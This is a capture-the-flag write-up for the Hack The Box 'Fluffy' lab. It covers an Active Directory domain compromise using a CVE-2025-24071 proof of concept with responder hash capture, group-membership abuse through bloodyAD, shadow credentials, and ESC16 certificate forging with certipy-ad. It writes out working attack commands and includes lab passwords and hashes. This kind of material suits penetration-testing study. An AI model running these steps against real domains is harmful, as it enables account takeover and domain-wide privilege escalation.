---
title: 'HTB-Fluffy'
published: 2025-09-18
draft: false
toc: true
---
**Start 18:20 26-06-2025**

---
```
Scope:
10.10.11.69

Creds:
j.fleischman / J0elTHEM4n1990!
```
# Recon
## Nmap

```bash
sudo nmap -sC -sV -sT -vvvv -p- -T5 --min-rate=5000 -Pn fluffy.htb

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-06-26 23:24:11Z)
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-26T23:25:40+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-26T23:25:40+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49689/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         syn-ack Microsoft Windows RPC
49693/tcp open  msrpc         syn-ack Microsoft Windows RPC
49707/tcp open  msrpc         syn-ack Microsoft Windows RPC
49724/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

## BloodHound

I'll start off by enumerating everything using `bloodhound-ce-python`, this way the whole db can populate while I'm doing the rest of enumeration.

![](attachments/b9b568c7f9f44bae0737dc6cafc4a6f6.png)

![](attachments/12483666aff7e923c0fff30f7416ebb8.png)

## 445/TCP - SMB

![](attachments/2b6742d67c39d3acf2bc2b9866bb8beb.png)

![](attachments/1590e6e742fc9b4ee1b97c0072a90ce1.png)

I went on and downloaded everything:

![](attachments/ecfeee6df6bf621e121403d719244f42.png)

First I checked out the `.pdf` file.

![](attachments/91da2fb3f3b39d6aff8a05ef70428822.png)

Here we get an overview of all the recently found vulnerabilities, if we're lucky these are not patched and we could still exploit them:

![](attachments/a11aac0c25f570b625fc577fba9efe6f.png)

I started enumerating them from top to bottom and found that the second one in the list could be the one I'm looking for:

![](attachments/d54b363fceeed63cb703a70e1cdbbc51.png)

![](attachments/c2e43468f7a5ec650b510363cc3d87ac.png)

Since this is exactly the premise that we're in with the found `.zip` file we can get to cookin:

![](attachments/e3b2137824d9026f40cbb87f770c403b.png)

I found a non-bloated version of the PoC [here](https://github.com/0x6rss/CVE-2025-24071_PoC/blob/main/poc.py):

![](attachments/c444a03870b05bf5e19fc2e511b12671.png)

I downloaded it and started exploiting:

### PoC

![](attachments/e0f0fb34087444ec1fa331ef115ad576.png)

![](attachments/953515a9d667e03314e0f6114369cd82.png)

We can now upload it and catch the response with `responder` when we have uploaded it to the `smb` share:

![](attachments/9a3e98189c8b7bc1c7daa20adea283be.png)

![](attachments/9942a395520265697990c3798168f4e8.png)

![](attachments/1ead0bfc4a4e976b0d4952781a19484d.png)

![](attachments/540866a841dcf5552a23f894fd252102.png)

```
p.agila
prometheusx-303
```

### Adding p.agila to SERVICE ACCOUNTS

Back in `BloodHound` I found the following for this user:

![](attachments/328016e5b480ece7dedd65a36d6eb416.png)

But most importantly:

![](attachments/fd35aa5dbd0e1cec242049bb146215ca.png)

And here we find out that we can add ourselves to the **Service Accounts** group. I will do this using `bloodyAD`:

```bash
bloodyAD -u 'p.agila' -p 'prometheusx-303' -d 'fluffy.htb' --dc-ip 10.10.11.69 add groupMember 'SERVICE ACCOUNTS' p.agila
```

![](attachments/01b717897088f565614411d2224aa18c.png)

### Shadow Credentials Attack

As per `BloodHound` I will now have to do the following:

![](attachments/5af43e0afbdfbb7a6fca4bcf5add7678.png)

![](attachments/49a8e72030e1a9ae816792b498f546bd.png)

Instead of `pywhisker.py` however I used `certipy-ad` for all three users in order to get all 3 hashes right away so I could log in with them later:

```bash
# Just change the account names in --account
certipy-ad shadow auto -u "p.agila@fluffy.htb" -p "prometheusx-303" -account 'WINRM_SVC'  -dc-ip '10.10.11.69'
```

![](attachments/99319e47055a7f800101561c9516274b.png)
![](attachments/227f5166e7aec8787c52e8702c251fb2.png)

Neither could be cracked so *pass-the-hash* it is:

![](attachments/d81c2e767e05019e9e157df70f8c3d2b.png)

# Foothold
## evil-winrm

![](attachments/fa66b6c1a2075b0bf7448f9419c1710d.png)

### user.txt

Here I found the `user.txt` flag:

![](attachments/d8c3831bc6999906c5e341d38501f984.png)

## Enumeration

But other than that pretty useless:

![](attachments/c408a0a5ffbf5f41563a8915a0814a51.png)

>[!caution]
>Problem was however that none of the other accounts could log in via `winrm`, so I had to think of something else.

We do find the following juicy stuff:

![](attachments/58fcf9702f399924edcad37fa412b0a9.png)

*CA_SVC* is a certificate service account, let's see what we can do with it:

```bash
certipy-ad find -u 'CA_SVC@fluffy.htb' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8'  -stdout -vulnerable -dc-ip 10.10.11.69
```

![](attachments/2d737c261de5fe9968429820fc861e0b.png)

It seems to be vulnerable to **ESC16**!

>[!note]
>[This blog post](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6) goes in detail about exploiting this vulnerability.

## ESC16 Abuse
### Forging Administrator UPN

```bash
certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -upn 'administrator' -user 'ca_svc' update -dc-ip 10.10.11.69
```

![](attachments/93e2e57f62b2c0fdd9d60ae501261afc.png)

Now that that is done we can verify the change with the `read` command:

![](attachments/b879da0707ad14f13457eeef90ef24f6.png)

Good, onto the next part.

### Request Certificate as Administrator

```bash
certipy-ad shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303'  -account 'ca_svc' auto -dc-ip 10.10.11.69
```

![](attachments/8ae96d256e69c46bcecbeb8ff39e00b1.png)

Now that we have exported the `krb5` ticket we can request the certificate:

```bash
certipy-ad req -k -target 'DC01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User' 
```

![](attachments/5315f2b395a88816c3670f555315a2fc.png)

Bingo.

# Privilege Escalation
## Restore CA_SVC account

We can now restore the account as follows:

```bash
certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update -dc-ip 10.10.11.69
```

![](attachments/69a8ed24d63db4e2bc931119c7a31f89.png)

### Persistence

I can now go ahead and modify the *Administrator* password in order to gain a backdoor in the system:

```bash
certipy-ad auth -pfx administrator.pfx -username 'administrator' -dc-ip 10.10.11.69 -domain fluffy.htb -ldap-shell
```

![](attachments/43325bed2ae0c6c0f3e01cd444e591db.png)

>[!note]
>You can use the command without `-ldap-shell` and it will give you the NTLM hash instead:
>![](attachments/e10be4cee3f222012a63df39951dba9a.png)

## evil-winrm as Administrator

![](attachments/8ac911ff9983ba43dfd9baaf59259d39.png)

I am now successfully logged in as *Administrator*, let's get `root.txt`:

### root.txt

![](attachments/f163122d8d92c8336de9d980634e29b1.png)

![](attachments/216f8616ee0fcaea1c8b4e283dce3e45.png)

---

**Finished 21:19 26-06-2025**

[^Links]: [[Hack The Box]]

#kerberoasting #ShadowCredentialsAttack #ESC16 #BloodyAD #BloodHound #certipy-ad 
